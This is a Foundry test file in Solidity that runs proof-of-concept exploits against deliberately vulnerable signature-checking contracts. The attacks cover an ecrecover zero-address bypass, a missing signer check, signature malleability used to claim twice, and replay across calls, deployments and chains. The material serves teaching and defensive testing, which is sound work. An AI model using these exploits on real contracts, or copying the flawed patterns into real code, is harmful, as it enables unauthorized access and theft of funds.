// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnEcrecoverZero} from "../src/vulnerable/VulnEcrecoverZero.sol";
import {VulnNoSignerCheck} from "../src/vulnerable/VulnNoSignerCheck.sol";
import {VulnMalleableReplay} from "../src/vulnerable/VulnMalleableReplay.sol";
import {VulnReplay} from "../src/vulnerable/VulnReplay.sol";

/// @notice Exploits against the intentionally vulnerable contracts. Each passing test is a successful attack.
///         `SignatureAuthorizer.t.sol` replays the same attacks against the secure contract.
contract VulnerableAttacksTest is Test {
    /// @dev Order of the secp256k1 curve; `n - s` is the malleable twin of `s`.
    uint256 internal constant SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    uint256 internal constant SIGNER_KEY = 0xA11CE;
    uint256 internal constant ATTACKER_KEY = 0xBAD;

    address internal signer;
    address internal attacker;
    address internal alice = makeAddr("alice");

    function setUp() public {
        signer = vm.addr(SIGNER_KEY);
        attacker = vm.addr(ATTACKER_KEY);
    }

    // --- VulnEcrecoverZero ---

    function test_EcrecoverZero_ValidSignatureWorks() public {
        VulnEcrecoverZero c = new VulnEcrecoverZero(signer);
        bytes32 hash = keccak256("authorize alice");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, hash);

        vm.expectEmit(true, false, false, false, address(c));
        emit VulnEcrecoverZero.UserAuthorized(alice);
        c.authorize(alice, hash, v, r, s);

        assertTrue(c.authorizedUsers(alice));
    }

    function test_EcrecoverZero_GarbageRejectedWhenSignerIsSet() public {
        VulnEcrecoverZero c = new VulnEcrecoverZero(signer);
        vm.expectRevert("bad signature");
        c.authorize(attacker, keccak256("x"), 0, bytes32(0), bytes32(0));
    }

    /// @notice ATTACK: with an unset signer, `ecrecover(...) == address(0) == trustedSigner` and nothing is signed.
    function test_Exploit_EcrecoverZero_GarbageSignatureAccepted() public {
        VulnEcrecoverZero c = new VulnEcrecoverZero(address(0));

        vm.prank(attacker);
        c.authorize(attacker, keccak256("anything"), 0, bytes32(0), bytes32(0));

        assertTrue(c.authorizedUsers(attacker));
    }

    function testFuzz_Exploit_EcrecoverZero_AnyGarbageWithInvalidV(bytes32 hash, bytes32 r, bytes32 s, uint8 v) public {
        v = uint8(bound(v, 0, 26)); // anything that is not 27 or 28 makes ecrecover return address(0)
        VulnEcrecoverZero c = new VulnEcrecoverZero(address(0));
        c.authorize(attacker, hash, v, r, s);
        assertTrue(c.authorizedUsers(attacker));
    }

    // --- VulnNoSignerCheck ---

    /// @notice ATTACK: the attacker signs with their OWN key and the contract accepts it.
    function test_Exploit_NoSignerCheck_AttackerSignsWithOwnKey() public {
        VulnNoSignerCheck c = new VulnNoSignerCheck();
        bytes32 hash = keccak256("authorize attacker");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ATTACKER_KEY, hash);

        vm.expectEmit(true, true, false, false, address(c));
        emit VulnNoSignerCheck.UserAuthorized(attacker, attacker);
        c.authorize(attacker, hash, v, r, s);

        assertTrue(c.authorizedUsers(attacker));
    }

    function test_NoSignerCheck_ZeroSignerRejected() public {
        VulnNoSignerCheck c = new VulnNoSignerCheck();
        vm.expectRevert("bad signature");
        c.authorize(attacker, keccak256("x"), 0, bytes32(0), bytes32(0));
    }

    function testFuzz_Exploit_NoSignerCheck_AnyKeyWorks(uint256 key) public {
        key = bound(key, 1, SECP256K1_N - 1);
        VulnNoSignerCheck c = new VulnNoSignerCheck();
        bytes32 hash = keccak256("authorize");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);
        c.authorize(alice, hash, v, r, s);
        assertTrue(c.authorizedUsers(alice));
    }

    // --- VulnMalleableReplay ---

    function test_MalleableReplay_SameSignatureRejectedTwice() public {
        VulnMalleableReplay c = new VulnMalleableReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);

        c.claim(alice, 100, v, r, s);
        vm.expectRevert("already used");
        c.claim(alice, 100, v, r, s);
    }

    function test_MalleableReplay_ConstructorRejectsZeroSigner() public {
        vm.expectRevert("zero signer");
        new VulnMalleableReplay(address(0));
    }

    function test_MalleableReplay_BadSignatureRejected() public {
        VulnMalleableReplay c = new VulnMalleableReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);
        vm.expectRevert("bad signature");
        c.claim(alice, 101, v, r, s); // signed amount differs
    }

    /// @notice ATTACK: flipping `s -> n - s` and `v` yields a second valid signature, so the "already used" check
    ///         does not trigger and the user is credited twice for one authorization.
    function test_Exploit_MalleableReplay_TwinSignatureClaimsTwice() public {
        VulnMalleableReplay c = new VulnMalleableReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);

        c.claim(alice, 100, v, r, s);
        c.claim(alice, 100, v == 27 ? 28 : 27, r, bytes32(SECP256K1_N - uint256(s)));

        assertEq(c.credits(alice), 200);
    }

    function testFuzz_Exploit_MalleableReplay_AlwaysDoubleClaims(uint96 amount) public {
        VulnMalleableReplay c = new VulnMalleableReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, amount);

        c.claim(alice, amount, v, r, s);
        c.claim(alice, amount, v == 27 ? 28 : 27, r, bytes32(SECP256K1_N - uint256(s)));

        assertEq(c.credits(alice), 2 * uint256(amount));
    }

    // --- VulnReplay ---

    function test_Replay_ValidClaimWorks() public {
        VulnReplay c = new VulnReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);

        vm.expectEmit(true, false, false, true, address(c));
        emit VulnReplay.Claimed(alice, 100);
        c.claim(alice, 100, v, r, s);

        assertEq(c.credits(alice), 100);
    }

    function test_Replay_ConstructorRejectsZeroSigner() public {
        vm.expectRevert("zero signer");
        new VulnReplay(address(0));
    }

    function test_Replay_BadSignatureRejected() public {
        VulnReplay c = new VulnReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);
        vm.expectRevert("bad signature");
        c.claim(alice, 101, v, r, s);
    }

    /// @notice ATTACK: no nonce, so the very same signature is submitted again and again.
    function test_Exploit_Replay_SameSignatureManyTimes() public {
        VulnReplay c = new VulnReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);

        for (uint256 i; i < 5; ++i) {
            c.claim(alice, 100, v, r, s);
        }

        assertEq(c.credits(alice), 500);
    }

    /// @notice ATTACK: the message has no domain, so a signature meant for deployment A also works on deployment B
    ///         (another contract, or the same code on another chain).
    function test_Exploit_Replay_SignatureWorksOnAnotherDeployment() public {
        VulnReplay deploymentA = new VulnReplay(signer);
        VulnReplay deploymentB = new VulnReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);

        deploymentA.claim(alice, 100, v, r, s);
        deploymentB.claim(alice, 100, v, r, s);

        assertEq(deploymentA.credits(alice), 100);
        assertEq(deploymentB.credits(alice), 100);
    }

    function test_Exploit_Replay_SignatureWorksOnAnotherChain() public {
        VulnReplay c = new VulnReplay(signer);
        (uint8 v, bytes32 r, bytes32 s) = _signClaim(alice, 100);

        vm.chainId(1);
        c.claim(alice, 100, v, r, s);
        vm.chainId(42161);
        c.claim(alice, 100, v, r, s);

        assertEq(c.credits(alice), 200);
    }

    function _signClaim(address user, uint256 amount) internal view returns (uint8 v, bytes32 r, bytes32 s) {
        (v, r, s) = vm.sign(SIGNER_KEY, keccak256(abi.encodePacked(user, amount)));
    }
}
